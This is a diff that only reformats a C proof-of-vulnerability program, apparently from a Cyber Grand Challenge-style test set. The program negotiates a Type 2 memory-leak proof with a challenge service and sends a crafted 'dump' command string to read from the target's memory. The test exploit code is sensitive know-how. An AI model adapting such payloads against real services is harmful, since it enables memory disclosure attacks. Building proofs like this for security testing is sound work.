@@ -25,9 +25,9 @@ THE SOFTWARE.
 */
 #include <libpov.h>
 
-#define TO_CB   1
+#define TO_CB 1
 #define FROM_CB 0
-#define TO_SF   3
+#define TO_SF 3
 #define FROM_SF 3
 
 int print_integer(char *s, unsigned int i) {
@@ -56,7 +56,7 @@ int SendToCB(char *buf, int length) {
   int total_sent = 0;
   int ret;
   size_t bytes_sent = 0;
-  while(total_sent < length) {
+  while (total_sent < length) {
     ret = transmit(TO_CB, buf + total_sent, length - total_sent, &bytes_sent);
     if (ret != 0) {
       // error
@@ -75,7 +75,8 @@ int ReceiveFromCB(char *buf, int length) {
   size_t bytes_received = 0;
   int ret;
   while (total_received < length) {
-    ret = receive(FROM_CB, buf + total_received , length - total_received , &bytes_received);
+    ret = receive(FROM_CB, buf + total_received, length - total_received,
+                  &bytes_received);
     if (ret != 0) {
       return -1;
     }
@@ -91,12 +92,12 @@ int main(void) {
   // negotiate
   type2_vals t2vals;
   type2_negotiate(&t2vals);
-  
+
   // perform POV
   char input[11];
   ReceiveFromCB(input, 10);
   char bytes[55] = "ish hostname +p password +l username dump 1128775680 \n";
-  //print_integer(bytes + 42, t2vals.region_addr);
+  // print_integer(bytes + 42, t2vals.region_addr);
   SendToCB(bytes, strlen(bytes));
   unsigned int i = 0xffffffff;
   SendToCB("quit\n", 5);
